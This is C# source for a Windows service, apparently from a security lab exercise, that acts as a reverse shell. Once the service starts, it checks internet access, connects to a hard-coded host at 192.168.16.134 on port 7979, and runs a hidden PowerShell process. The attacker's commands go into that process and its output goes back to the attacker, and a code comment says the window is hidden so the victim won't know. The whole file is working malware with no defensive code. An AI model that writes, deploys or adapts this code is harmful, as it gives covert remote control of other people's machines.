using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Lab3Service_Bai3
{
    public partial class Service1 : ServiceBase
    {
        Thread start;
        static TcpClient client;
        static Stream stream;
        static StreamReader reader;
        static StreamWriter writer;
        public Service1()
        {
            InitializeComponent();
        }
        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" +
           DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
        protected override void OnStart(string[] args)
        {
            start = new Thread(new ThreadStart(main));
            start.Start();  
        }

        private void main()
        {
            WriteToFile($"{DateTime.Now.ToString("dd/MM/yyyy HH:mm")} Kiểm tra internet");
            string hostname = "google.com";
            Ping ping = new Ping();
            PingReply reply = ping.Send(hostname);

            if (reply.Status == IPStatus.Success)
            {
                WriteToFile($"{DateTime.Now.ToString("dd/MM/yyyy HH:mm")} start reverse shell");
                using (client = new TcpClient("192.168.16.134", 7979))
                {
                    using (stream = client.GetStream())
                    {
                        using (reader = new StreamReader(stream))
                        {
                            using (writer = new StreamWriter(stream))
                            {
                                // start powershell process
                                Process p = new Process();
                                p.StartInfo.FileName = "powershell.exe";
                                // no pop up windows so victim won't know
                                p.StartInfo.CreateNoWindow = true;
                                p.StartInfo.UseShellExecute = false;
                                // redirect stream standard input & output to manually handling
                                p.StartInfo.RedirectStandardOutput = true;
                                p.StartInfo.RedirectStandardInput = true;
                                p.StartInfo.RedirectStandardError = true;
                                // add event handlers which send output to attacker
                                p.OutputDataReceived += new DataReceivedEventHandler(OutputDataHandler);
                                p.ErrorDataReceived += new DataReceivedEventHandler(ErrorDataHandler);
                                p.Start();
                                p.BeginOutputReadLine();
                                p.BeginErrorReadLine();

                                // allocate a new string
                                StringBuilder input = new StringBuilder();
                                while (true)
                                {
                                    // read from attacker's input
                                    input.Append(reader.ReadLine());
                                    // pass attacker's input to powershell process
                                    p.StandardInput.WriteLine(input);
                                    // input = ""
                                    input.Remove(0, input.Length);
                                }
                            }
                        }
                    }
                }
            }
            else
            {
                WriteToFile($"{DateTime.Now.ToString("dd/MM/yyyy HH:mm")} Không thể kết nối internet.");
            }
        }

        protected override void OnStop()
        {
            start.Abort();
        }

        private static void OutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder output = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    // output = output from powershell process
                    output.Append(outLine.Data);
                    // send it to attacker (stream writer)
                    writer.WriteLine(output);
                    writer.Flush();
                }
                catch (Exception) { }
            }
        }

        private static void ErrorDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder output = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    output.Append(outLine.Data);
                    writer.WriteLine(output);
                    writer.Flush();
                }
                catch (Exception) { }
            }
        }
    }
}
